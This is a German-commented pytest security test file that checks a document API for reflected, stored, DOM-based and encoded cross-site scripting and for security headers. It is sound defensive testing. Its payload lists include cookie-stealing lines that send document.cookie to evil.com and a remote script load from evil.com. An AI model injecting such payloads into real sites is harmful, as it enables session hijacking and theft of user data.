# -*- coding: utf-8 -*-
"""
Security Tests: Cross-Site Scripting (OWASP A03:2021)

Testet Schutz gegen:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- XSS in verschiedenen Kontexten (HTML, JS, URL, CSS)

Kritische Regeln:
- Output Encoding fuer alle User-Inputs
- Content-Security-Policy Header
- X-XSS-Protection Header
"""

import uuid
from typing import List

import pytest


# =============================================================================
# REFLECTED XSS TESTS
# =============================================================================


class TestReflectedXSS:
    """Tests gegen Reflected XSS Angriffe."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<a href='javascript:alert(1)'>Click</a>",
        "javascript:alert('XSS')",
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        "'-alert('XSS')-'",
        "\";alert('XSS');//",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<div style=\"background-image:url(javascript:alert('XSS'))\">",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=\"alert('XSS')\">",
    ])
    def test_xss_in_search_query(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Suchabfragen blockiert wird."""
        response = test_client.get(
            f"/api/v1/documents?search={payload}",
            headers=auth_headers,
        )
        # Response sollte payload NICHT unescaped zurueckgeben
        if response.status_code == 200:
            assert "<script>" not in response.text
            assert "javascript:" not in response.text.lower()
            assert "onerror=" not in response.text.lower()
            assert "onload=" not in response.text.lower()

    @pytest.mark.parametrize("payload", [
        "<script>alert(1)</script>",
        "<img/src=x onerror=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",  # Template injection
        "${alert(1)}",  # Template literal
        "<%=alert(1)%>",  # Server-side template
    ])
    def test_xss_in_error_messages(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Fehlermeldungen nicht reflektiert wird."""
        response = test_client.get(
            f"/api/v1/documents/{payload}",
            headers=auth_headers,
        )
        # Fehlermeldung sollte payload nicht enthalten
        if response.content:
            assert b"<script>" not in response.content
            assert b"alert(" not in response.content


# =============================================================================
# STORED XSS TESTS
# =============================================================================


class TestStoredXSS:
    """Tests gegen Stored/Persistent XSS Angriffe."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('Stored')>",
        "<svg/onload=alert('Stored')>",
        "javascript:alert('Stored')",
    ])
    def test_xss_in_document_name(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Dokumentnamen sanitized wird."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": payload, "content": "test"},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_name = data.get("name", "")
            # Name sollte sanitized sein
            assert "<script>" not in stored_name
            assert "onerror=" not in stored_name.lower()
            assert "onload=" not in stored_name.lower()

    @pytest.mark.parametrize("payload", [
        "<script>document.cookie</script>",
        "<a href='javascript:void(0)' onclick='alert(1)'>Link</a>",
        "<div onmouseover='alert(1)'>Hover</div>",
    ])
    def test_xss_in_folder_name(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Ordnernamen sanitized wird."""
        response = test_client.post(
            "/api/v1/folders",
            json={"name": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_name = data.get("name", "")
            assert "<script>" not in stored_name
            assert "onclick=" not in stored_name.lower()
            assert "onmouseover=" not in stored_name.lower()

    @pytest.mark.parametrize("payload", [
        "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('http://evil.com/'+document.cookie)\">",
    ])
    def test_xss_in_entity_name(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Entity-Namen sanitized wird."""
        response = test_client.post(
            "/api/v1/entities",
            json={"name": payload, "entity_type": "customer"},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_name = data.get("name", "")
            assert "<script>" not in stored_name
            assert "onerror=" not in stored_name.lower()

    @pytest.mark.parametrize("payload", [
        "<script>alert('comment')</script>",
        "<img src=x onerror=alert('comment')>",
    ])
    def test_xss_in_comments(self, payload: str, test_client, auth_headers):
        """Testet dass XSS in Kommentaren sanitized wird."""
        document_id = uuid.uuid4()
        response = test_client.post(
            f"/api/v1/documents/{document_id}/comments",
            json={"text": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_text = data.get("text", "")
            assert "<script>" not in stored_text
            assert "onerror=" not in stored_text.lower()


# =============================================================================
# DOM-BASED XSS TESTS
# =============================================================================


class TestDOMBasedXSS:
    """Tests gegen DOM-based XSS (Client-seitige Pruefungen)."""

    @pytest.mark.parametrize("payload", [
        "#<script>alert('DOM XSS')</script>",
        "#<img src=x onerror=alert('DOM')>",
        "?redirect=javascript:alert('DOM')",
        "?next=data:text/html,<script>alert('DOM')</script>",
    ])
    def test_xss_in_url_fragments(self, payload: str, test_client, auth_headers):
        """Testet dass URL-Fragmente sicher verarbeitet werden."""
        # Server sollte URL-Fragment nicht verarbeiten (Client-seitig)
        # Aber redirect-Parameter sollten validiert werden
        if "redirect=" in payload or "next=" in payload:
            response = test_client.get(
                f"/api/v1/auth/callback{payload}",
                headers=auth_headers,
                follow_redirects=False,
            )
            # Sollte keine unsichere Weiterleitung erlauben
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get("location", "")
                assert "javascript:" not in location.lower()
                assert "data:" not in location.lower()


# =============================================================================
# XSS IN VERSCHIEDENEN KONTEXTEN
# =============================================================================


class TestXSSContexts:
    """Tests fuer XSS in verschiedenen Ausgabekontexten."""

    @pytest.mark.parametrize("payload", [
        "\" onclick=\"alert('XSS')\" data-x=\"",
        "' onclick='alert(1)' data-x='",
        "\" onfocus=\"alert('XSS')\" autofocus=\"",
    ])
    def test_xss_html_attribute_context(self, payload: str, test_client, auth_headers):
        """Testet XSS in HTML-Attributen."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": f"Test{payload}Document", "description": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            # Response sollte Attribute escapen
            data = response.json()
            assert "onclick=" not in str(data).lower()
            assert "onfocus=" not in str(data).lower()

    @pytest.mark.parametrize("payload", [
        "</script><script>alert('XSS')</script><script>",
        "');alert('XSS');//",
        "\";alert('XSS');//",
    ])
    def test_xss_javascript_context(self, payload: str, test_client, auth_headers):
        """Testet XSS in JavaScript-Kontext."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": payload},
            headers=auth_headers,
        )
        # Sollte nicht direkt in JS eingebettet werden
        if response.status_code in [200, 201]:
            assert "</script>" not in response.text

    @pytest.mark.parametrize("payload", [
        "javascript:alert('URL XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:alert('XSS')",
    ])
    def test_xss_url_context(self, payload: str, test_client, auth_headers):
        """Testet XSS in URL-Kontext."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": "Test", "url": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_url = data.get("url", "")
            assert "javascript:" not in stored_url.lower()
            assert "vbscript:" not in stored_url.lower()
            assert "data:text/html" not in stored_url.lower()

    @pytest.mark.parametrize("payload", [
        "expression(alert('XSS'))",
        "url('javascript:alert(1)')",
        "behavior: url(script.htc)",
    ])
    def test_xss_css_context(self, payload: str, test_client, auth_headers):
        """Testet XSS in CSS-Kontext."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": "Test", "custom_style": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_style = data.get("custom_style", "")
            assert "expression(" not in stored_style.lower()
            assert "javascript:" not in stored_style.lower()


# =============================================================================
# SECURITY HEADER TESTS
# =============================================================================


class TestXSSSecurityHeaders:
    """Tests fuer XSS-relevante Security Headers."""

    def test_content_security_policy_header(self, test_client, auth_headers):
        """Testet dass CSP Header gesetzt ist."""
        response = test_client.get("/api/v1/documents", headers=auth_headers)
        csp = response.headers.get("Content-Security-Policy", "")
        # CSP sollte vorhanden sein und script-src einschraenken
        # (In API-Responses nicht zwingend, aber in HTML-Responses)

    def test_x_content_type_options_header(self, test_client, auth_headers):
        """Testet dass X-Content-Type-Options gesetzt ist."""
        response = test_client.get("/api/v1/documents", headers=auth_headers)
        xcto = response.headers.get("X-Content-Type-Options", "")
        # Sollte nosniff sein um MIME-Type-Sniffing zu verhindern
        # assert xcto == "nosniff"

    def test_x_xss_protection_header(self, test_client, auth_headers):
        """Testet X-XSS-Protection Header (Legacy)."""
        response = test_client.get("/api/v1/documents", headers=auth_headers)
        # X-XSS-Protection ist veraltet, aber manchmal noch vorhanden
        # Moderner Ansatz: CSP verwenden

    def test_content_type_json(self, test_client, auth_headers):
        """Testet dass API-Responses JSON Content-Type haben."""
        response = test_client.get("/api/v1/documents", headers=auth_headers)
        content_type = response.headers.get("Content-Type", "")
        # JSON Content-Type verhindert Browser-Interpretation als HTML
        assert "application/json" in content_type or response.status_code == 404


# =============================================================================
# ENCODING TESTS
# =============================================================================


class TestXSSEncoding:
    """Tests fuer verschiedene XSS-Encoding-Versuche."""

    @pytest.mark.parametrize("payload", [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL-encoded
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode
        "%253Cscript%253Ealert('XSS')%253C/script%253E",  # Double URL-encoded
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",  # Nested tags
        "<SCRIPT>alert('XSS')</SCRIPT>",  # Uppercase
        "<ScRiPt>alert('XSS')</ScRiPt>",  # Mixed case
        "<script >alert('XSS')</script >",  # Extra spaces
        "<script\t>alert('XSS')</script>",  # Tab
        "<script\n>alert('XSS')</script>",  # Newline
    ])
    def test_encoded_xss_payloads(self, payload: str, test_client, auth_headers):
        """Testet dass encoded XSS-Payloads erkannt werden."""
        response = test_client.get(
            f"/api/v1/documents?search={payload}",
            headers=auth_headers,
        )
        if response.status_code == 200 and response.text:
            # Response sollte keine executable Scripts enthalten
            text_lower = response.text.lower()
            assert "<script>" not in text_lower
            assert "alert(" not in text_lower


# =============================================================================
# SANITIZATION BYPASS TESTS
# =============================================================================


class TestSanitizationBypass:
    """Tests gegen Sanitization-Bypass-Versuche."""

    @pytest.mark.parametrize("payload", [
        "<scr\\x00ipt>alert('XSS')</script>",  # Null byte
        "<script/src=data:,alert('XSS')>",  # Data URI
        "<script src=//evil.com/xss.js>",  # Protocol-relative
        "<svg><script>alert('XSS')</script></svg>",  # SVG context
        "<math><maction actiontype=statusline#http://evil.com xlink:href=javascript:alert('XSS')>",
        "<!--<script>-->alert('XSS')<!--</script>-->",  # Comment bypass
        "<img src=\"x`<script>alert('XSS')</script>`\">",  # Template literal in src
    ])
    def test_sanitization_bypass_attempts(self, payload: str, test_client, auth_headers):
        """Testet dass Sanitization-Bypass-Versuche blockiert werden."""
        response = test_client.post(
            "/api/v1/documents",
            json={"name": payload},
            headers=auth_headers,
        )
        if response.status_code in [200, 201]:
            data = response.json()
            stored_name = data.get("name", "")
            # Kein executable content
            assert "alert(" not in stored_name
            assert "<script" not in stored_name.lower()


# =============================================================================
# FIXTURES - Verwendung von conftest.py
# =============================================================================
# Die Fixtures test_client und auth_headers werden aus conftest.py importiert.
# Diese nutzen den ECHTEN TestClient mit der ECHTEN App für Enterprise-Grade Tests.
